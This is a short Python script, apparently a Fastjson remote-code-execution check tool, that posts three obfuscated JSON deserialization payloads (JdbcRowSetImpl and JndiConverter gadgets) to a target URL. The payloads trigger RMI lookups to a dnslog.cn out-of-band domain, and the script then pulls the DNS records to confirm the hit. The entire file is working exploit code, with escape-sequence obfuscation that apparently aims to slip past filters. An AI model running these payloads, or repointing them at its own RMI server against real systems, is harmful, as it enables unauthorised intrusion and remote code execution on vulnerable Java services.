import requests
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
    "Accept": "*/*",
    "Content-Type": "application/json"
}

def check(vul_url):
    print('[+] get dnslog domain ...')
    rsp = requests.get(url='http://www.dnslog.cn/getdomain.php')
    dnslog = rsp.text
    cookie = rsp.raw.headers['Set-Cookie'].split(';')[0].split('=')[1]
    cookies = {"PHPSESSID":cookie}
    print('[+] dnslog domain: ' + dnslog)
    print('[+] send payload to target ...')
    payload_1 = '{"a": {"\u0040\x74\u0079p\x65": "\u006a\u0061\x76a.\x6c\u0061\u006eg.C\u006c\u0061\u0073\x73","val": "\u0063om\x2Esu\u006E\u002Er\u006F\u0077\u0073e\x74.Jdbc\u0052\x6Fw\x53\x65t\u0049\u006D\x70\u006C"},"b": {"@\x74\u0079p\x65": "\u0063om\x2Esu\u006E\u002Er\u006F\u0077\u0073e\x74.Jdbc\u0052\x6Fw\x53\x65t\u0049\u006D\x70\u006C","dataSourceName": "rmi://poc1.' + dnslog +'/Object","autoCommit": true}}'
    payload_2 = '{"a": {"\u0040\x74\u0079p\x65": "Lcom\u002E\u0073u\u006E.\x72o\u0077\u0073e\u0074\x2E\x4Ad\x62\x63\u0052\x6F\x77\u0053\u0065\x74I\u006D\u0070l;","dataSourceName": "rmi://poc2.' + dnslog + '/Object","autoCommit": true}}'
    payload_3 = '{"a": {"\u0040\x74\u0079p\x65": "\u006F\u0072\x67.\x61p\u0061\x63\u0068\x65\u002E\u0078\u0062ea\x6E\u002E\x70\u0072o\x70\x65\x72t\u0079ed\x69\x74or\u002EJ\x6Ed\u0069Con\x76e\x72\u0074e\x72","AsText": "rmi://poc3.' + dnslog + '/Object"}}'
    rsp1 = requests.post(url=vul_url, data=payload_1, headers=headers, verify=False, timeout=5)
    rsp2 = requests.post(url=vul_url, data=payload_2, headers=headers, verify=False, timeout=5)
    rsp3 = requests.post(url=vul_url, data=payload_3, headers=headers, verify=False, timeout=5)
    print('[+] payload send completed, get dns records ...\n')
    print('-----------------------------------------------')
    rspdns = requests.get(url='http://www.dnslog.cn/getrecords.php', cookies=cookies).text
    print(rspdns)

if __name__ == "__main__":
    print('''
-----------------------------------------------
Fastjson RCE check script by LuckyEast >_<
-----------------------------------------------
    ''')
    url = sys.argv[1]
    check(url)
